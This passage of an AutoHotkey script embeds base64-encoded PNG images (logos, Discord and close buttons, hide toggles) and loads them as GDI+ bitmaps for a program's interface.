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")
A_Args.PNG.LogoTop      := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.Logo16x16    := Gdip_BitmapFromBase64(0,1,Data.PNG "BAAAAAQCAIAAACQkWg2AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAKWSURBVDhPRVJJT1NRGP1MNC5AEO3EUAql47OPvvm+oXN9bVGCQCkt5NlaeWWwEDGgCAEJjRAkRHDhEFlocGUkLo24YOPGnb/Ahf/E+1oST+7ifPee8w33XmAY+v1ix49ty7cNy89D017RzDAMWwcmtTbmL6meWpXTFuXEqzA0BRua/c9Xf1Xnl6rC8G2KCQawNJUSVFXgOJb0kf1OIsFRqky984j7PgEOH3SPjQiRAZ5CpChyWL1YVZwORyxKYU+90n+sNNGwO9tXGBNaTX0AzZN5Y1cQCIDLJptbTfI41DRlby9tFGTZh2YaPjzpKU0IftIPYIGL9rsFDqAdwEQGCayeuie/3ElnMkYpkgx+JCQoDjjHR3hbt9vj9ZptvQAtXr/P0eP2+LxrK7HaWiIeN+pgcCyTMRGA2eAtAaBLK7BVHWHDo/kQEm/Ahfb95zdl2Zgqn0WlkhyNGNwwDA1igzWlkvh4qozSqkD2+2Z0NDcTj0aM9CgkA3DahHRuyI7gxNecLhfmDWyuRmPxKDSjRqimDUN+TMTcMIRDnF6RtML5JebHxdrGoLVTuWrh9XKoVFbcpHjdKo9n6wYzO8lx50+LUbmvrC+rxaJ8ZzQOwODE9cUzSiw3KgwNu8G1dRwIBBvq2enQ9rNUpD6cpz/SZJIW5sJTegiFw82WsDaBdl64oL1co2ka/4JKJbS1mcQEI5ngW2wyXDF6wEhlwgByIYeWlj3QNv0KfzO8iydpHGPgu6e4WAAlG2G+kOz1p7LDaHW9D9wLOx1zhxTHoYjkZSSCoLBCENhcTsqOiok4M5AJzlfR7Ix4dkY/XusBiqZduyet+78uPf3eefTbsfQad9hIjKFXu46/dL45sn/6bD9466Dp4D8rxbw8afqHDwAAAABJRU5ErkJggg==")
A_Args.PNG.BarraTop     := Gdip_BitmapFromBase64(0,1,Data.PNG "AEAAAAZCAIAAAB/8tMoAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZSURBVBhXYzA2NqYJtrWyYHB3tGEwMzYAAO2IDzPhkUQ0AAAAAElFTkSuQmCC")
A_Args.PNG.Discord      := Gdip_BitmapFromBase64(0,1,Data.PNG "E4AAAAYCAIAAADbH1ygAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAVzSURBVFhH5ZZ5U6NFEMb9MISEcAQIgZAQCHfkCBAgHIGEK5wBQjhkVw6BBcFjtWq9j9KyPMt13XV11fIoj1W8b6tcP42/pF/G15Cs4D9uap/qgu6emTfzzHT39B1Ztw1uP6pGU25H8IHQwqWh2OWhhTf/RWKXQ9FLbYF7DdlGWZ4R0Kj6w0/FDv48rfhCD8nyjIBGdW7npyQaJ5Gp9euyPCOgUZ3Z/DqJxkkkvPqBLM8IaFSnNr5MonESGVt5T5ZnBFJTnbnnm57xpwciLw8vXe2bfG5k6e1A5KXeiWfx66cpqtQno8mcbczJNpqzs03iTMCg/dehoMiZW2DTDB0KiirMecWaoYPFWplvsWtGHCm+KTAYsuMbiG8jLpr3CCmojiy9U2ityjFbTOYCGQXoeApLqkeXr6mZimqzf2N685CPTG9+xd/BudfKq7rxs/vwmY8QZ00/ZmXDsFrO2YkTVDWOin9+9xcONDe/RPyezjMTZz/Bv7B/IxR9Q+ZzlDwBfHMcOfsxSvfoY7LEVRc62sYhApE6bzTxpThSUJVdpoOzuk/NVFQ7hy8opxLOxWjKE91e1cWNiR7d+10UfpS1jupeMfXCtTd1ryU5kVJnK5eX5EQm1z7jU1BN8iNcQ2KPx6hyLeK5CSJb38pkRbVt4ACTguzpXPUG9uZ3f8NsH7yPIZlZaHXXtsyizG7/IEvq22L5hQ6DwcAv4ueKyt3+2pYZSl1H6DzHtLD/B/7h2BVHdY/bMx7Z/h6TnGLt9MYhejB6sdG3QqKhI0Ul1UW2WtG9/btN/vWJuz9Fnzv3s/xiMtWukQvi4W4HZ1/lyNEJMGKypLxJhrrHHpfJiqp4+qdfEDM4/zomV61uFapEL8r87q8tPVu28maZSTTiwd/atyMeAbcqCyvrh8QjL39w/iI6Z6ofiu7FT7aidqC4tF5WiR+26NQXMZOpcvbi6Zt6HjMw8yI6lNB9Qw/LUJ13XiYrqg53D6YEJBiIvILJ5dCEycwyVzt1QnQRGNY0TzNZ3rn2wftlrYAkl2kyB/jHnsAkw9Gn1r8Qvd4bbQvsxw5uYNoczaacfIk4SV2OD13tKplqWUU7JodNZYKb3CSZ5gud56SlutorO2WyogqIPcqAlEc2wShLFFX3neP48y3lHcEHI1vfiROxOVsJURTazMRnNCiqbk9YPF0jj2DqqeqFYJa95VnKxu56X6Km2b/JUFqqhAEmQV/q9MqQgr3SB38UCUVET1UPiYLu0UdVANc0TWljCZS5OuQqWnq3aadR6MBlyFrWwF+uRRbWtc6JX46PyegSwIpwePVDmZMEqSAkuZgpypKrPoSHYkBZI4zZMUmILpWZUfW6KqokM0lOLHUlJssoqcKQ6BwTF8V9zu78yO4R8XOgpB8KG4J2z8Qz6KMr71rtHmai81utfeeIL5nPI883eUjQ2Ul10yQKM9ktfpujhd3CkOacF0i6XUI6vsXjVEWGF6/KKeqFvKWX0HsUVYqW3o/AindYPTBsgnRVoyKkNGs5wSQ/ZcacZyUQkvxIIqy0x4Zqz/LJtc/FJBxcdUHR9YIzscc0VE8oimpD+yJXQdbRXfGXhMwrKMXPzqSFkFOnB/CHn6RbGF58i7tSfQ9+ijZPCLFDJJPh4ufSiNh4V7B+nWApsXtwUt6GYlf4ZmPHMiZVF5NegmwnRviyyMjyNboRu8uX+FIcGlV5tU4r6XI1FdJ2cwpSV44DbnR8mhFH6k/Fm8E0XxAc3eqxmpZSOBF9/TwN1f8fGlUCmj5TcbiJ0NOowkPQyvKMgEYVWIpd5AyPTUVNIJ3wzMhkqUMkjJgZgb+pnhbS/f0zi25p/HeqgC6SF0UzbnFkZf0F9sdYKfywHLkAAAAASUVORK5CYII=")
A_Args.PNG.HDiscord     := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.XClose       := Gdip_BitmapFromBase64(0,1,Data.PNG "BwAAAAWCAIAAABc9GulAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAABvSURBVEhLYzCmARg1lPqA7oZ29fTZ2jtBOUgAKAiUgnKwAXyGAjUvW7EazVysgmiAgPfRjCDGRCAgHKZwg4g0EQiIiiiIcUSaCAQDZCjERCAJZ0AlcAO6RxRWI4gxF5+hNEn8ZINRQ6kPaGCosTEAeNmPBGY4+RgAAAAASUVORK5CYII=")
A_Args.PNG.HXClose      := Gdip_BitmapFromBase64(0,1,Data.PNG "BwAAAAWCAIAAABc9GulAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAB1SURBVEhL7dJBCoAgFIThbvfu4kG9i7ugXRA0IEiMokOmbYQfiWd9ULbtZp+3UB71Nx09vT+coyHCEFs0fFZD8fAVArnFIdV4fSIUEbW/aYJEEUkHFTlRRD+hUcSaLuiGvOkHVSQUt4YO+flft1Ae9TcANbsB3Xa5ri4MuhIAAAAASUVORK5CYII=")
A_Args.PNG.HideHOFF     := Gdip_BitmapFromBase64(0,0,Data.PNG "BIAAAASCAIAAADZrBkAAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAACASURBVDhP1ZNJDoAgEAT9k7+Zsz+ABOTz2tqjGZZE8KR1kJ6lQjg4icgyCJSJx9wNrzk0bXTzBW1Nabvw3mvX0NC4rUVVklLDRggBAV9k59ydz7mSaXaGTLTOp43bGPAk5BgjS+uAUgPFBqg7DQ1gz6JdQ1t75E/amx+HxxAisgNEcCwtspiqeAAAAABJRU5ErkJggg==")
A_Args.PNG.HideHON      := Gdip_BitmapFromBase64(0,0,Data.PNG "BIAAAASCAIAAADZrBkAAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAB/SURBVDhP1ZNLDoAgDES9k7fp2htAAnJ5HZ1iGqwG3RjfQqafF8LCQUSmh0AZeIzd8JpN00Y3/9bmUpZKjFG7FV/jthanEjgaNlJKCPgihxCOvM83Ws3OkInWZurfxoAnIeecWVrf0YDdIE3H1wD2LNqtXGr3fKK9+XF4PEJEVku1LC3F/kcuAAAAAElFTkSuQmCC")
A_Args.PNG.HideOFF      := Gdip_BitmapFromBase64(0,0,Data.PNG "BIAAAASCAYAAABWzo5XAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAB+SURBVDhP7ZDRCcAgDAU7SZZwA8fw2w0UtC5veYGAtVEpfrYPDpMYDvHw3tddrLWVRcaYLYjok6KzlNomxqjugaFIspoJqghJKXGNEwkh3Pp2HzxE/VKbft72wxdJjX9Bcs7qvTD9o342mw9FQIu2B6aiN/yiNSxyznGxB9ULmnJSBvMOU+EAAAAASUVORK5CYII=")
A_Args.PNG.HideON       := Gdip_BitmapFromBase64(0,0,Data.PNG "BIAAAASCAYAAABWzo5XAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAB6SURBVDhP7ZDRCcAgDEQ7iUu4gWP4nQ0UtC6fcoKgkhrBv9KDwzMeD8lljOFTO+e4gqy1RyaiH6RYBd2lcK8Yo9hbgpq0GfwKglJKNeOEQgjDve+LoLnUa563vPxRy9gLlHMW32F1R7vzJQiWJPVU0K6/DvLe13Bm4gdnllIGZFPrlAAAAABJRU5ErkJggg==")
